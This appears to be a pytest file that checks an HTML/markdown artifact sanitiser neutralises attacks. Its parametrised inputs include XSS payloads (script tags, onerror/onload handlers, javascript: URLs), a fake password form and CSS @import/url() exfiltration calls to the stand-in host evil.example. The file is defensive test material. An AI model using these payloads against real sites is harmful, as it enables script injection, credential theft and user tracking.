"""Artifact sanitisation.

This is the security boundary the brief asks us to defend, so the tests are
written as an attack list. Each case is a real XSS or exfiltration vector, and
each must be neutralised by layer 1 alone — without relying on the iframe
sandbox, which is layer 2.
"""

from __future__ import annotations

import pytest

from app.security.sanitize import sanitize_artifact, sanitize_html, sanitize_markdown


class TestScriptExecution:
    @pytest.mark.parametrize(
        "payload",
        [
            "<script>alert(1)</script>",
            "<SCRIPT>alert(1)</SCRIPT>",
            "<scr<script>ipt>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<div onmouseover='alert(1)'>hover</div>",
            "<svg onload=alert(1)></svg>",
            "<body onload=alert(1)>",
            "<iframe src='https://evil.example'></iframe>",
            "<object data='evil.swf'></object>",
            "<embed src='evil.swf'>",
        ],
    )
    def test_no_executable_vector_survives(self, payload: str):
        clean, _ = sanitize_html(payload)
        lowered = clean.lower()
        assert "<script" not in lowered
        assert "onerror" not in lowered
        assert "onload" not in lowered
        assert "onmouseover" not in lowered
        assert "<iframe" not in lowered
        assert "<object" not in lowered
        assert "<embed" not in lowered


class TestUrlSchemes:
    @pytest.mark.parametrize(
        "payload",
        [
            "<a href='javascript:alert(1)'>x</a>",
            "<a href='JaVaScRiPt:alert(1)'>x</a>",
            "<a href='vbscript:msgbox(1)'>x</a>",
            "<a href='data:text/html,<script>alert(1)</script>'>x</a>",
        ],
    )
    def test_dangerous_schemes_are_stripped(self, payload: str):
        clean, _ = sanitize_html(payload)
        lowered = clean.lower()
        assert "javascript:" not in lowered
        assert "vbscript:" not in lowered
        assert "data:text/html" not in lowered

    def test_safe_links_survive_with_noopener(self):
        clean, _ = sanitize_html("<a href='https://example.com'>docs</a>")
        assert "https://example.com" in clean
        # Without noopener the opened tab can navigate ours via window.opener.
        assert "noopener" in clean


class TestCredentialHarvesting:
    def test_forms_and_inputs_are_removed(self):
        payload = (
            "<form action='https://evil.example'>"
            "<input type='password' name='pw'><button>Sign in</button></form>"
        )
        clean, report = sanitize_html(payload)
        assert "<form" not in clean.lower()
        assert "<input" not in clean.lower()
        assert "dangerous_tag" in report["findings"]

    def test_base_tag_cannot_hijack_relative_urls(self):
        clean, _ = sanitize_html("<base href='https://evil.example/'><a href='/x'>x</a>")
        assert "<base" not in clean.lower()


class TestCssExfiltration:
    def test_import_of_remote_stylesheet_is_stripped(self):
        clean, report = sanitize_html(
            "<style>@import url(https://evil.example/x.css); body{color:red}</style>"
        )
        assert "@import" not in clean
        assert "evil.example" not in clean
        assert "css_import" in report["findings"]
        assert "color:red" in clean, "legitimate CSS must survive"

    def test_remote_background_url_is_neutralised(self):
        clean, report = sanitize_html(
            "<style>body{background:url(https://evil.example/track.png)}</style>"
        )
        assert "evil.example" not in clean
        assert "css_remote_url" in report["findings"]

    def test_data_uri_images_are_allowed(self):
        # Charts and diagrams depend on this, and a data: URI reaches no network.
        payload = "<img src='data:image/png;base64,iVBORw0KGgo='>"
        clean, _ = sanitize_html(payload)
        assert "data:image/png" in clean


class TestLegitimateContent:
    def test_a_real_artifact_passes_through_intact(self):
        payload = (
            "<style>.card{padding:1rem;border-radius:8px}</style>"
            "<div class='card'><h2>Retention</h2>"
            "<table><thead><tr><th>Day</th><th>Rate</th></tr></thead>"
            "<tbody><tr><td>D1</td><td>40%</td></tr></tbody></table>"
            "<ul><li><strong>Activation</strong> drives D7</li></ul></div>"
        )
        clean, report = sanitize_html(payload)
        for fragment in ("padding:1rem", "<h2>", "<table>", "<strong>", "40%"):
            assert fragment in clean
        assert report["findings"] == [], "no false positives on ordinary markup"

    def test_report_records_sizes_and_modification_flag(self):
        _, report = sanitize_html("<p>hello</p>")
        assert report["sanitizer"] == "nh3"
        assert report["original_bytes"] > 0
        assert report["sanitized_bytes"] > 0


class TestMarkdown:
    def test_script_blocks_removed(self):
        clean, report = sanitize_markdown("# Title\n\n<script>alert(1)</script>\n\nBody")
        assert "<script" not in clean
        assert "script_block" in report["findings"]

    def test_markdown_structure_preserved(self):
        source = "# Title\n\n- one\n- two\n\n**bold** and `code`\n"
        clean, report = sanitize_markdown(source)
        assert clean == source
        assert report["modified"] is False


def test_dispatch_selects_the_right_sanitizer():
    _, html_report = sanitize_artifact("html", "<p>x</p>")
    _, md_report = sanitize_artifact("markdown", "# x")
    assert html_report["sanitizer"] == "nh3"
    assert md_report["sanitizer"] == "markdown-strip"
